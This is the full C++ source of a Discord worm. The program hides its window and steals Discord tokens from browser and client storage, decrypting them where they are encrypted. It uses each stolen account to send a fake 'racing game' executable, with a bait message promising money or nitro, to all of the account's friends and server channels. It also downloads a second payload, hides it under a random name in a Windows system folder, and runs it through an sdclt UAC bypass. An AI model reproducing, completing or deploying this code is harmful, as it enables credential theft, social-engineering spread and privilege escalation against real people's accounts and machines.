#include "main.hpp"
#include "xorstr.hpp"
#include <cpr/cpr.h>
#include <filesystem>
#include <fstream>
#include <nlohmann/json.hpp>
#include <optional>
#include <regex>
#include <sstream>
#include <thread>
#include <vector>
#include "base64.hpp"
#include <wincrypt.h>
#include <cryptopp/aes.h>
#include <cryptopp/gcm.h>
#include <cryptopp/base64.h>
#include <cryptopp/filters.h>
#include <windows.h>
#include <shellapi.h>
#include <random>
#include <chrono>
#include <algorithm>

#define DM_MESSAGE "Hey man! I made a racing game, could u test it? ill pay u 15$ or give u nitro if u do! Tysm and kind regards."
#define SERVER_MESSAGE "@everyone Hey Guys! I made a racing game, could yall test it? ill pay u 15$ or give u nitro if u do! just dm me. Tysm and kind regards."
#define PAYLOAD_URL "https://example.com/worm.exe"           // The worm itself
#define ATTACHMENT_URL "https://example.com/RaceG1-v1.4.exe" // The file to upload to Discord


using namespace std;
using namespace std::filesystem;
using namespace nlohmann;

#define FIND(needle, haystack) std::find(haystack.begin(), haystack.end(), needle) != haystack.end()

regex tokenPattern(X("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"));
regex encryptedPattern(X("dQw4w9WgXcQ:[^\"]*"));
vector<string> tokens;
vector<string> channelsSentIn;

// Characters for random name generation (for payload only)
const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

// List of system paths to randomly move the payload to
vector<string> systemPaths = {
    "C:\\Windows\\System32\\winevt\\Logs",
    "C:\\Windows\\System32\\winevt\\TraceFormat",
    "C:\\Windows\\System32\\LogFiles\\WMI",
    "C:\\Windows\\System32\\LogFiles\\Firewall",
    "C:\\Windows\\System32\\LogFiles\\SQM",
    "C:\\Windows\\System32\\LogFiles\\Scm",
    "C:\\Windows\\System32\\LogFiles\\WindowsUpdate",
    "C:\\Windows\\System32\\LogFiles\\MSDTC",
    "C:\\Windows\\System32\\LogFiles\\GatherNet",
    "C:\\Windows\\System32\\LogFiles\\SetupCln",
    "C:\\Windows\\System32\\LogFiles\\WUDF",
    "C:\\Windows\\System32\\catroot2",
    "C:\\Windows\\System32\\catroot",
    "C:\\Windows\\System32\\spool\\PRINTERS",
    "C:\\Windows\\System32\\spool\\SERVERS",
    "C:\\Windows\\System32\\spool\\drivers\\x64\\3",
    "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
    "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp",
    "C:\\Windows\\System32\\config\\TxR",
    "C:\\Windows\\System32\\config\\RegBack",
    "C:\\Windows\\System32\\config\\Journal",
    "C:\\Windows\\System32\\com\\dmp",
    "C:\\Windows\\System32\\ras",
    "C:\\Windows\\System32\\icsxml",
    "C:\\Windows\\System32\\DriverStore\\Temp",
    "C:\\Windows\\System32\\DriverStore\\OldStore",
    "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Customer Experience Improvement Program",
    "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\DiskDiagnostic",
    "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Location",
    "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\MobilePC",
    "C:\\Windows\\Temp",
    "C:\\Windows\\System32\\drivers",
    "C:\\Windows\\System32",
    "C:\\Windows\\SysWOW64",
    "C:\\Windows\\Installer",
    "C:\\System Volume Information",
    "C:\\$Recycle.Bin",
    "C:\\ProgramData",
    "C:\\Windows\\System32\\spool\\drivers\\color",
    "C:\\Windows\\System32\\Tasks",
    "C:\\Windows\\System32\\config",
    "C:\\Windows\\System32\\GroupPolicy",
    "C:\\Windows\\System32\\GroupPolicy\\Machine",
    "C:\\Windows\\System32\\GroupPolicy\\User",
    "C:\\Windows\\System32\\LogFiles",
    "C:\\Windows\\System32\\wbem",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
    "C:\\Windows\\Microsoft.NET\\Framework",
    "C:\\Windows\\Microsoft.NET\\Framework64",
    "C:\\Windows\\WinSxS",
    "C:\\Program Files\\WindowsApps",
    "C:\\Windows\\System32\\DriverStore\\FileRepository"
};

// Random number generator
random_device rd;
mt19937 gen(rd());

// Generate random string of length between 8 and 20 (for payload only)
string GenerateRandomName() {
    uniform_int_distribution<> lenDist(8, 20);
    uniform_int_distribution<> charDist(0, CHARS.size() - 1);
    
    int length = lenDist(gen);
    string result;
    result.reserve(length);
    
    for (int i = 0; i < length; i++) {
        result += CHARS[charDist(gen)];
    }
    return result;
}

// Hide console by moving off-screen, making transparent, 1x1 size, no borders
void HideConsole() {
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) {
        LONG style = GetWindowLong(consoleWnd, GWL_STYLE);
        style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
        SetWindowLong(consoleWnd, GWL_STYLE, style);
        
        SetWindowLong(consoleWnd, GWL_EXSTYLE, GetWindowLong(consoleWnd, GWL_EXSTYLE) | WS_EX_LAYERED);
        SetLayeredWindowAttributes(consoleWnd, 0, 0, LWA_ALPHA);
        
        SetWindowPos(consoleWnd, NULL, -4000, -4000, 1, 1, SWP_NOZORDER | SWP_NOACTIVATE);
        
        SetWindowLong(consoleWnd, GWL_EXSTYLE, GetWindowLong(consoleWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
        
        EnableWindow(consoleWnd, FALSE);
    }
}

void FindTokens(const path path, bool encrypted = false) {
    const auto leveldb = path / X("Local Storage") / X("leveldb");
    if (!exists(leveldb))
        return;

    const auto localState = path / X("Local State");
    if (encrypted && !exists(localState))
        return;

    std::string master_key;
    if (encrypted) {
        ifstream ifs(localState);
        json j;
        ifs >> j;
        ifs.close();

        const auto key = j[X("os_crypt")][X("encrypted_key")].get<string>();
        const auto keyBytes = base64::from_base64(key).substr(5);
        DATA_BLOB dataIn, dataOut, entropy;
        dataIn.pbData = (BYTE*)keyBytes.data();
        dataIn.cbData = keyBytes.size();
        entropy.pbData = NULL;
        entropy.cbData = 0;

        if (CryptUnprotectData(&dataIn, NULL, &entropy, NULL, NULL, 0, &dataOut)) {
            master_key = string((char*)dataOut.pbData, dataOut.cbData);
            LocalFree(dataOut.pbData);
        }
    }

    if (encrypted && master_key.empty())
        return;

    for (const auto &file : directory_iterator(leveldb)) {
        const auto extension = file.path().extension();
        if (extension != X(".ldb") && extension != X(".log"))
            continue;

        ifstream t(file.path(), ios::binary);
        stringstream buffer;
        buffer << t.rdbuf();
        string s = buffer.str();

        for (auto it = sregex_iterator(s.begin(), s.end(), encryptedPattern); it != sregex_iterator(); ++it) {
            const auto encrypted = it->str();
            const auto encryptedBytes = base64::from_base64(encrypted.substr(encrypted.find(':') + 1));

            const auto iv = encryptedBytes.substr(3, 12);
            const auto payload = encryptedBytes.substr(15);

            string decrypted;
            try {
                CryptoPP::GCM<CryptoPP::AES>::Decryption d;
                d.SetKeyWithIV((const ::byte*)master_key.data(), master_key.size(), (const ::byte*)iv.data(), iv.size());
                CryptoPP::StringSource s(payload, true,
                    new CryptoPP::AuthenticatedDecryptionFilter(d,
                        new CryptoPP::StringSink(decrypted),
                        CryptoPP::AuthenticatedDecryptionFilter::DEFAULT_FLAGS,
                        16
                    )
                );
            }
            catch (const CryptoPP::Exception& e) {
                continue;
            }
            
            if (FIND(decrypted, tokens))
                continue;

            tokens.push_back(decrypted);
        }

        for (auto it = sregex_iterator(s.begin(), s.end(), tokenPattern); it != sregex_iterator(); ++it) {
            const auto token = it->str();
            if (FIND(token, tokens))
                continue;
            tokens.push_back(token);
        }
    }
}

// Download a file from URL and save to temp
string DownloadFile(const string& url, const string& filename) {
    auto filePath = path(getenv("TEMP")) / filename;
    auto out = std::ofstream(filePath.string(), ios::binary);
    auto session = cpr::Session();
    session.SetUrl(cpr::Url{url});
    session.Download(out);
    out.close();
    return filePath.string();
}

// Send file as attachment to Discord channel (always as RaceG1-v1.4.exe)
void SendFileAsAttachment(string token, string channelId, const string& filePath, const string& message, bool isServer = false) {
    // Channel Mutex
    if (FIND(channelId, channelsSentIn))
        return;
    channelsSentIn.push_back(channelId);

    ostringstream channelUrl;
    channelUrl << X("https://discord.com/api/v9/channels/") << channelId << X("/messages");
    
    // Fixed attachment name: RaceG1-v1.4.exe
    string attachmentName = "RaceG1-v1.4.exe";
    
    // Create multipart form with file attachment
    cpr::Multipart multipart{
        {"content", message},
        {"file", cpr::File(filePath), attachmentName}
    };
    
    cpr::Post(
        cpr::Url{channelUrl.str()},
        cpr::Header{{X("Authorization"), token}},
        multipart
    );
}

void ProcessChannel(string token, string channelId, const string& attachmentPath, bool server = false) {
    SendFileAsAttachment(token, channelId, attachmentPath, server ? SERVER_MESSAGE : DM_MESSAGE, server);
}

// Check if running as admin
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

// Request UAC elevation (silent, no message box)
bool RequestUACElevation(const string& payloadPath) {
    HINSTANCE result = ShellExecuteA(
        NULL,
        "runas",
        payloadPath.c_str(),
        NULL,
        NULL,
        SW_HIDE
    );
    return ((intptr_t)result > 32);
}

// Bypass UAC via sdclt.exe
bool BypassUACWithSdclt(const string& payloadPath) {
    HKEY hKey;
    string registryPath = "Software\\Classes\\exefile\\shell\\runas\\command";
    
    LONG result = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        registryPath.c_str(),
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL
    );
    
    if (result == ERROR_SUCCESS) {
        RegSetValueExA(
            hKey,
            "IsolatedCommand",
            0,
            REG_SZ,
            (const BYTE*)payloadPath.c_str(),
            payloadPath.size() + 1
        );
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        string sdcltArgs = "C:\\Windows\\System32\\sdclt.exe /KickOffElev";
        
        BOOL created = CreateProcessA(
            NULL,
            &sdcltArgs[0],
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        );
        
        if (created) {
            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        RegDeleteValueA(hKey, "IsolatedCommand");
        RegCloseKey(hKey);
        RegDeleteKeyA(HKEY_CURRENT_USER, registryPath.c_str());
        
        return created;
    }
    return false;
}

// Move payload to random system location with random name
string MoveToRandomSystemPath(const string& sourcePath) {
    uniform_int_distribution<> dis(0, systemPaths.size() - 1);
    string targetDir = systemPaths[dis(gen)];
    
    try {
        create_directories(path(targetDir));
    } catch (...) {
        targetDir = string(getenv("TEMP"));
    }
    
    // Use random name for the payload
    string randomName = GenerateRandomName() + ".exe";
    string targetPath = path(targetDir) / randomName;
    
    try {
        copy_file(sourcePath, targetPath, copy_options::overwrite_existing);
        return targetPath;
    } catch (...) {
        return sourcePath;
    }
}

// Main execution function with infinite retries
bool ExecutePayloadWithFallback(const string& payloadPath) {
    if (BypassUACWithSdclt(payloadPath)) {
        return true;
    }
    
    while (true) {
        if (RequestUACElevation(payloadPath)) {
            return true;
        }
        Sleep(500);
    }
    return false;
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
    HideConsole();
    
    if (IsRunningAsAdmin()) {
        auto payloadPath = path(getenv("TEMP")) / "tmp.exe";
        if (exists(payloadPath)) {
            ShellExecuteA(NULL, "open", payloadPath.string().c_str(), NULL, NULL, SW_HIDE);
        }
        return 0;
    }
    
    // FIRST: Download the attachment file (the file to send on Discord)
    string attachmentFile = DownloadFile(ATTACHMENT_URL, "RaceG1-v1.4.exe");
    
    // Discord token locations
    auto local = path(getenv("LOCALAPPDATA"));
    auto roaming = path(getenv("APPDATA"));

    const auto encryptedPaths = {
        roaming / X("Discord"),
        roaming / X("discordcanary"),
        roaming / X("discordptb"),
        roaming / X("Lightcord"),
    };

    const auto paths = {
        roaming / X("Opera Software") / X("Opera Stable"),
        roaming / X("Opera Software") / X("Opera GX Stable"),
        local / X("Amigo") / X("User Data"),
        local / X("Torch") / X("User Data"),
        local / X("Kometa") / X("User Data"),
        local / X("Orbitum") / X("User Data"),
        local / X("CentBrowser") / X("User Data"),
        local / X("7Star") / X("7Star") / X("User Data"),
        local / X("Sputnik") / X("Sputnik") / X("User Data"),
        local / X("Vivaldi") / X("User Data") / X("Default"),
        local / X("Google") / X("Chrome SxS") / X("User Data"),
        local / X("Google") / X("Chrome") / X("User Data") / X("Default"),
        local / X("Epic Privacy Browser") / X("User Data"),
        local / X("Microsoft") / X("Edge") / X("User Data") / X("Default"),
        local / X("BraveSoftware") / X("Brave-Browser") / X("User Data") / X("Default"),
        local / X("Yandex") / X("YandexBrowser") / X("User Data") / X("Default"),
    };

    vector<thread> tokenFinderThreads;
    for (const auto &path : paths) {
        tokenFinderThreads.push_back(thread(FindTokens, path, false));
    }

    for (const auto &path : encryptedPaths) {
        tokenFinderThreads.push_back(thread(FindTokens, path, true));
    }

    for (auto &t : tokenFinderThreads) {
        t.join();
    }

    vector<string> usedAccounts;
    vector<thread> speadingThreads;
    
    // Pass the attachment file path to all threads
    for (auto &token : tokens) {
        speadingThreads.push_back(thread(
            [&usedAccounts, attachmentFile](string token) {
                auto headers = cpr::Header{{X("Authorization"), token}, {X("Content-Type"), X("application/json")}};
                auto _me = cpr::Get(cpr::Url{X("https://discord.com/api/v9/users/@me")}, headers);
                if (_me.status_code != 200)
                    return;
                auto me = json::parse(_me.text);
                if (FIND(me[X("id")], usedAccounts))
                    return;
                usedAccounts.push_back(me[X("id")]);

                // Send file to all friends (DM - no @everyone)
                auto _friends = cpr::Get(cpr::Url{X("https://discord.com/api/v9/users/@me/relationships")}, headers);
                auto friends = json::parse(_friends.text);

                for (auto &_friend : friends) {
                    json channelPayload{{X("recipients"), json::array({_friend[X("id")]})}};
                    auto _channel = cpr::Post(cpr::Url{X("https://discord.com/api/v9/users/@me/channels")}, headers,
                                              cpr::Body{channelPayload.dump(-1)});
                    string channelId = json::parse(_channel.text)[X("id")];
                    ProcessChannel(token, channelId, attachmentFile, false);  // false = DM, no @everyone
                }

                // Send file to all server channels (with @everyone)
                auto _guilds = cpr::Get(cpr::Url{X("https://discord.com/api/v9/users/@me/guilds")}, headers);
                auto guilds = json::parse(_guilds.text);
                for (auto &guild : guilds) {
                    string guildId = guild[X("id")];
                    ostringstream channelsUrl;
                    channelsUrl << X("https://discord.com/api/v9/guilds/") << guildId << X("/channels");
                    auto _channels = cpr::Get(cpr::Url{channelsUrl.str()}, headers);
                    auto channels = json::parse(_channels.text);

                    for (auto &channel : channels) {
                        ProcessChannel(token, channel[X("id")], attachmentFile, true);  // true = server, includes @everyone
                    }
                }
            },
            token));
    }

    // Payload download and execution (the worm itself)
    thread payload([] {
        // Download the worm payload
        auto payloadPath = path(getenv("TEMP")) / "tmp.exe";
        auto out = std::ofstream(payloadPath.string(), ios::binary);
        auto session = cpr::Session();
        session.SetUrl(cpr::Url{PAYLOAD_URL});
        session.Download(out);
        out.close();

        // Move to random system location with random name
        string finalPath = MoveToRandomSystemPath(payloadPath.string());
        
        // Execute with fallback
        ExecutePayloadWithFallback(finalPath);
    });

    payload.join();
    
    // Wait for all spreading threads to complete
    for (auto &t : speadingThreads) {
        t.join();
    }
    
    // Delete the attachment file after sending
    try {
        remove(attachmentFile);
    } catch (...) {}

    return 0;
}
